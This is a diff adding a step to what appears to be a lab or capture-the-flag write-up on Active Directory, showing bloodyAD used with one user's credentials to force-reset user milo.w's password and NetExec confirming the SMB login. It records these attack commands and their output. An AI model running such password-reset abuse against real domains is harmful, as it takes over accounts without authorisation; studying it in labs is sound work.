@@ -418,5 +418,16 @@ And checking the privileges of both those users `milo.w` looks more interesting 
 # Compromising `milo.w`
 
 ```python
+bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u mitch.r -p 'snitch1993' set password 'milo.w' 'Password123!'
 
+[+] Password changed successfully!
 ```
+
+```python
+nxc smb sg-dc01.shadowgate.local -u milo.w -p 'Password123!'                                                    
+SMB         10.1.232.232    445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.232.232    445    SG-DC01          [+] shadowgate.local\milo.w:Password123!
+```
+
+This user is now compromised!
+
